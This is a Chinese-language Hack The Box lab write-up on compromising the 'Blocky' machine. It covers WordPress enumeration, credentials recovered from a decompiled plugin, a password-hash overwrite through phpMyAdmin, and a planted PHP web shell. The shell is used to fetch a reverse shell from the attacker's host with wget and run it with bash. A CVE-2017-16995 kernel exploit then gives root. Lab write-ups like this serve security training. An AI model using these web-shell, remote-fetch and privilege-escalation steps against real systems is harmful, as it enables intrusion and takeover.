---
title: Blocky (Hack The Box Writeup)
date: 2021-09-15T13:40:00+08:00
draft: false
url: "/2021/09/15/blocky-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/48
- IP : 10.129.1.53

## Recon

- Rustscan![](/uploads/2022/02/c1560-P89zhUR.png)Nmap- ![](/uploads/2022/02/3da4d-bDwHzxn.png)觀察首頁- ![](/uploads/2022/02/c5cdb-WqNoQVr.jpg)
- ![](/uploads/2022/02/92cf0-HvhvLma.png)
- 看起來是 Wordpress掃目錄- https://www.exploit-db.com/exploits/46676
- phpmyadmin
- pluginsPHPmyadmin- ![](/uploads/2022/02/f3a45-awdZmG7.png)
- ![](/uploads/2022/02/d5f61-btMisFu.png)
- Version `4.5.4.1`
- ![](/uploads/2022/02/2c3bb-4t4v8Sa.png)
- 有 Exploithttps://www.exploit-db.com/exploits/40185要帳密繼續觀察- ![](/uploads/2022/02/862f9-SrBdmAD.png)
- 他有一個 Wiki
- ![](/uploads/2022/02/804fe-FPx76mQ.png)
- 其實剛剛 dirsearch 就有看到

## Wordpress

- 觀察 Wordpress 使用者`http://10.129.1.53/index.php/?author=1`
- `notch`
- ![](/uploads/2022/02/6f709-ZBjHwgb.png)
- ![](/uploads/2022/02/48759-HHVGKWD.png)嘗試登入 `/wp-admin`- ![](/uploads/2022/02/a2d43-boYSIEU.png)觀察目錄 `/plugins`- `plugins`
- ![](/uploads/2022/02/39abb-PI5v79z.png)
- 裡面有兩個檔案
- 感覺 `BlockyCore.jar` 是它們自己寫的

## Reverse

- 用 r2 觀察![](/uploads/2022/02/4c433-JnQg4vm.png)算ㄌ還是不要裝逼，乖乖用 jd-gui 笑死- ![](/uploads/2022/02/48237-YnpMm9M.png)找到 db 帳密- `root`
- `8YsqfCTnvxAUeduzjNSXe22`

## PHP My admin

- 用帳密登入後找到 Wordpress 使用者頁面![](/uploads/2022/02/30dbe-dxptAUw.png)
- 備份原本使用者的 hash 以備不時之需
- `$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`把 hash 修改成 `12345` 的 md5- `827ccb0eea8a706c4c34a16891f84e7b`
- ![](/uploads/2022/02/71f6a-uQGlHLJ.png)

## 登入 Wordpress

- 用帳號 `notch` 密碼 `12345` 登入![](/uploads/2022/02/656c9-z9HTx8b.png)在 plugin 中增加 php web shell- ![](/uploads/2022/02/9ec64-40gCNnS.png)確認 webshell 可用- ![](/uploads/2022/02/3443f-JSS7xV0.png)下載 reverse shell- http://10.129.1.53/wp-content/plugins/akismet/akismet.php?A=wget%2010.10.16.35:8000/s_HTB執行 webshell- http://10.129.1.53/wp-content/plugins/akismet/akismet.php?A=bash%20s_HTB

## Reverse shell

- ![](/uploads/2022/02/2f965-7JQhg8u.png)
- spawn shell`python3 -c 'import pty; pty.spawn("/bin/bash")'`

## 提權

- 跑 Linpeas![](/uploads/2022/02/74d52-RNLfKEz.png)
- 發現可以 Kernel Exploit
- https://github.com/rlarabee/exploits/tree/master/cve-2017-16995編譯並丟過去- https://raw.githubusercontent.com/rlarabee/exploits/master/cve-2017-16995/cve-2017-16995.c
- ![](/uploads/2022/02/de1ff-7lmSnLK.png)取得 Flag- User![](/uploads/2022/02/53eb7-JOMWCbN.png)
- `59fee0977fb60b8a0bc6e41e751f3cd5`Root- ![](/uploads/2022/02/8c899-y15GubM.png)
- `0a9694a5b4d272c694679f7860f1cd5f`看了一下正規解- 貌似可以直接用 SQL 密碼 SSH 登入
- 然後 sudo su 就結束ㄌ
- ㄏㄏ
